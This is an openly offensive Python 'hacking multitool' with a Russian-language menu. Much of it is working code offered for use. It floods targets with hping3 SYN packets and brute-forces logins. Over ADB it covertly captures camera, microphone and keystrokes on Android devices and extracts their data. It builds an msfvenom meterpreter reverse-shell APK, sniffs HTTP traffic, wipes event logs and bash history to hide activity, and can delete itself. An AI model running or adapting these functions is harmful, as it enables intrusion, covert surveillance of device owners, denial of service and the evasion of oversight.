#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ALL-IN-ONE TOOL — Мультитул для пентеста и хакинга
# Termux / Windows / Linux

import os, sys, json, time, subprocess, socket, random, string, shutil
from pathlib import Path
from datetime import datetime

DATA = "tool_data"
os.makedirs(DATA, exist_ok=True)

# ==================== УСТАНОВКА ЗАВИСИМОСТЕЙ ====================
def install_all():
    print("📦 Установка ВСЕХ зависимостей...")
    if sys.platform == 'win32':
        pkgs = 'opencv-python numpy requests colorama pycryptodome scapy python-nmap'
    else:
        pkgs = 'opencv-python numpy requests cryptodome scapy python-nmap'
    os.system(f'pip install {pkgs}')
    
    if sys.platform != 'win32':
        os.system('pkg install nmap tcpdump termux-api -y')
    
    print("✅ Всё готово!")

# ==================== СЕТЬ ====================
def scan_ports(target=None):
    if not target:
        target = input("🎯 Цель (IP или сеть): ").strip()
    print(f"🔍 Сканирую {target}...")
    os.system(f'nmap -T4 -F {target}')

def scan_wifi():
    print("📡 Сканирую Wi-Fi...")
    if sys.platform == 'win32':
        os.system('netsh wlan show networks')
    else:
        os.system('termux-wifi-scaninfo')

def fake_ap():
    ssid = input("📶 Название сети: ").strip() or "Free_WiFi"
    print(f"📡 Запускаю {ssid}...")
    print("⚠️ Включи точку доступа в Настройках Android вручную")
    print(f"   Имя: {ssid}")
    print(f"   Защита: Открытая")

def sniff_traffic():
    print("👂 Слушаю трафик... Ctrl+C стоп")
    os.system(f'tcpdump -i any -A "tcp port 80 or tcp port 8080" >> {DATA}/sniffed.txt 2>&1')

def find_cameras():
    print("📷 Сканирую камеры...")
    base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
    ports = [80, 554, 8080, 8899, 37777, 8000, 8554]
    cameras = []
    
    for port in ports:
        for i in range(1, 255):
            ip = f"{base}.{i}"
            try:
                s = socket.socket()
                s.settimeout(0.2)
                if s.connect_ex((ip, port)) == 0:
                    print(f"  ✅ {ip}:{port}")
                    cameras.append({"ip": ip, "port": port})
                s.close()
            except: pass
    
    with open(f'{DATA}/cameras.json', 'w') as f:
        json.dump(cameras, f, indent=2)
    print(f"✅ Найдено: {len(cameras)}")

def view_cameras():
    if not os.path.exists(f'{DATA}/cameras.json'):
        print("❌ Сначала просканируй")
        return
    with open(f'{DATA}/cameras.json') as f:
        cams = json.load(f)
    for i, c in enumerate(cams):
        print(f"  {i+1}. {c['ip']}:{c['port']}")

# ==================== УСТРОЙСТВА ====================
def adb_connect():
    ip = input("📱 IP телефона: ").strip()
    os.system(f'adb connect {ip}:5555')

def extract_android():
    print("📱 Извлечение данных...")
    os.system(f'adb pull /sdcard/DCIM {DATA}/extracted/')
    os.system(f'adb pull /sdcard/Download {DATA}/extracted/')
    print(f"✅ Данные в {DATA}/extracted/")

def screenshot():
    print("📸 Скриншот...")
    os.system(f'adb exec-out screencap -p > {DATA}/screen.png')
    print("✅ Сохранён")

def hidden_camera():
    print("📷 Скрытая камера (нужен root)...")
    os.system(f'adb shell su -c "am start -n com.android.camera/.Camera --ez extra_hide_ui true"')

def hidden_mic():
    print("🎤 Скрытый микрофон (нужен root)...")
    os.system(f'adb shell su -c "arecord -d 30 {DATA}/audio.wav"')

# ==================== ВЗЛОМ ====================
def bruteforce():
    target = input("🎯 IP:порт (пример 192.168.1.1:80): ").strip()
    user = input("👤 Логин: ").strip() or "admin"
    wordlist = input("📚 Файл паролей: ").strip() or f"{DATA}/passwords.txt"
    
    if not os.path.exists(wordlist):
        with open(wordlist, 'w') as f:
            for p in ['admin','12345','password','admin123','root','guest','0000']:
                f.write(p + '\n')
    
    print(f"🔓 Брутфорс {target}...")
    with open(wordlist) as f:
        for pwd in f:
            pwd = pwd.strip()
            try:
                import requests
                r = requests.get(f'http://{target}', auth=(user, pwd), timeout=3)
                if r.status_code == 200:
                    print(f"  ✅ {user}:{pwd}")
                    return
            except: pass
    print("  ❌ Не найден")

def wifi_bruteforce():
    ssid = input("📶 Сеть: ").strip()
    wordlist = input("📚 Словарь: ").strip()
    print(f"🔓 Брутфорс {ssid}...")
    print("⚠️ Нужен адаптер с монитором и рукопожатие")

def search_cve():
    software = input("🔍 Софт/версия: ").strip()
    print(f"🔍 Ищу CVE для {software}...")
    os.system(f'searchsploit {software}')

# ==================== ЗАЩИТА ====================
def clear_logs():
    print("🧹 Чищу логи...")
    if sys.platform == 'win32':
        os.system('wevtutil cl System 2>nul')
        os.system('wevtutil cl Security 2>nul')
        os.system('wevtutil cl Application 2>nul')
    else:
        os.system('rm -rf /data/data/com.termux/files/home/.bash_history')
    print("✅ Логи очищены")

def change_mac():
    new_mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
    print(f"🔄 Новый MAC: {new_mac}")
    if sys.platform == 'win32':
        os.system(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\\0001" /v NetworkAddress /d {new_mac.replace(":","")} /f')
    else:
        os.system(f'su -c "ip link set wlan0 address {new_mac}"')

def check_root():
    print("🔍 Проверка рут...")
    if sys.platform == 'win32':
        print("  Windows — админ всегда")
    else:
        r = os.popen('su -c id 2>/dev/null').read()
        print(f"  {'✅ Root есть' if 'uid=0' in r else '❌ Root нет'}")

# ==================== ДАННЫЕ ====================
def recover_files():
    path = input("📁 Путь для поиска: ").strip()
    ext = input("📝 Расширение (.jpg .pdf .txt): ").strip()
    print(f"🔍 Ищу *{ext} в {path}...")
    for root, dirs, files in os.walk(path):
        for f in files:
            if f.endswith(ext):
                print(f"  📄 {os.path.join(root, f)}")

def encrypt_file():
    fname = input("📄 Файл: ").strip()
    key = input("🔑 Пароль: ").strip()
    try:
        from Crypto.Cipher import AES
        with open(fname, 'rb') as f:
            data = f.read()
        cipher = AES.new(key.ljust(16)[:16].encode(), AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        with open(fname + '.enc', 'wb') as f:
            [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
        print(f"✅ {fname}.enc")
    except Exception as e:
        print(f"❌ {e}")

def decrypt_file():
    fname = input("📄 Файл .enc: ").strip()
    key = input("🔑 Пароль: ").strip()
    try:
        from Crypto.Cipher import AES
        with open(fname, 'rb') as f:
            nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
        cipher = AES.new(key.ljust(16)[:16].encode(), AES.MODE_EAX, nonce=nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)
        out = fname.replace('.enc', '.dec')
        with open(out, 'wb') as f:
            f.write(data)
        print(f"✅ {out}")
    except Exception as e:
        print(f"❌ {e}")

def hidden_folder():
    name = input("📁 Название скрытой папки: ").strip() or ".hidden"
    path = f"{DATA}/{name}"
    os.makedirs(path, exist_ok=True)
    if sys.platform == 'win32':
        os.system(f'attrib +h "{path}"')
    print(f"✅ Скрытая папка: {path}")

# ==================== БОНУС ====================
def keylogger():
    print("⌨️ Кейлогер (нужен root)...")
    print("⚠️ Запускаю на 30 секунд")
    os.system(f'adb shell su -c "getevent -lt /dev/input/event0" > {DATA}/keys.txt 2>&1 &')
    time.sleep(30)
    os.system('adb shell su -c "killall getevent"')
    print(f"✅ {DATA}/keys.txt")

def ddos():
    target = input("🎯 IP:порт: ").strip()
    print(f"💥 DDoS {target}... (Ctrl+C стоп)")
    os.system(f'hping3 -S --flood -V {target}')

def whois_lookup():
    domain = input("🌐 Домен: ").strip()
    os.system(f'whois {domain}')

def generate_payload():
    lhost = input("📡 Твой IP: ").strip()
    lport = input("🔌 Порт: ").strip() or "4444"
    out = input("📄 Файл (payload.apk): ").strip() or f"{DATA}/payload.apk"
    print("⚙️ Генерация...")
    os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {out}')
    print(f"✅ {out}")

def self_destruct():
    print("💀 Самоуничтожение через 3 сек...")
    time.sleep(3)
    shutil.rmtree(DATA, ignore_errors=True)
    os.remove(__file__)
    print("💀 Готово")

# ==================== ГЛАВНОЕ МЕНЮ ====================
def main():
    print("""
╔══════════════════════════════════════╗
║  🔧 ALL-IN-ONE TOOL v2.0          ║
║  Termux | Windows | Linux          ║
╚══════════════════════════════════════╝
""")
    
    while True:
        print("""
╔══════════════════════════════════════╗
║           📡 СЕТЬ                   ║
║  1. Сканер портов                  ║
║  2. Сканер Wi-Fi                   ║
║  3. Фейковая точка доступа         ║
║  4. Перехват трафика               ║
║  5. Найти камеры                   ║
║  6. Смотреть камеры                ║
╠══════════════════════════════════════╣
║           📱 УСТРОЙСТВА             ║
║  7. ADB подключение                ║
║  8. Извлечь данные Android         ║
║  9. Скриншот                       ║
║  10. Скрытая камера (root)         ║
║  11. Скрытый микрофон (root)       ║
║  12. Кейлогер (root)               ║
╠══════════════════════════════════════╣
║           🔓 ВЗЛОМ                  ║
║  13. Брутфорс паролей              ║
║  14. Wi-Fi брутфорс               ║
║  15. Поиск CVE                     ║
║  16. DDoS                          ║
║  17. Генератор payload             ║
╠══════════════════════════════════════╣
║           🛡️ ЗАЩИТА                 ║
║  18. Очистка логов                 ║
║  19. Смена MAC                     ║
║  20. Проверка рут                  ║
╠══════════════════════════════════════╣
║           💾 ДАННЫЕ                 ║
║  21. Восстановление файлов         ║
║  22. Зашифровать файл              ║
║  23. Расшифровать файл             ║
║  24. Скрытая папка                 ║
╠══════════════════════════════════════╣
║           🌐 ИНФО                   ║
║  25. WHOIS                         ║
╠══════════════════════════════════════╣
║  98. Установить зависимости        ║
║  99. САМОУНИЧТОЖЕНИЕ               ║
║  0. Выход                          ║
╚══════════════════════════════════════╝
""")
        
        c = input('>>> ').strip()
        
        if c == '0': break
        elif c == '1': scan_ports()
        elif c == '2': scan_wifi()
        elif c == '3': fake_ap()
        elif c == '4': sniff_traffic()
        elif c == '5': find_cameras()
        elif c == '6': view_cameras()
        elif c == '7': adb_connect()
        elif c == '8': extract_android()
        elif c == '9': screenshot()
        elif c == '10': hidden_camera()
        elif c == '11': hidden_mic()
        elif c == '12': keylogger()
        elif c == '13': bruteforce()
        elif c == '14': wifi_bruteforce()
        elif c == '15': search_cve()
        elif c == '16': ddos()
        elif c == '17': generate_payload()
        elif c == '18': clear_logs()
        elif c == '19': change_mac()
        elif c == '20': check_root()
        elif c == '21': recover_files()
        elif c == '22': encrypt_file()
        elif c == '23': decrypt_file()
        elif c == '24': hidden_folder()
        elif c == '25': whois_lookup()
        elif c == '98': install_all()
        elif c == '99': self_destruct()
        else: print('❌ Неверно')

if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: print("\n👋 Выход")
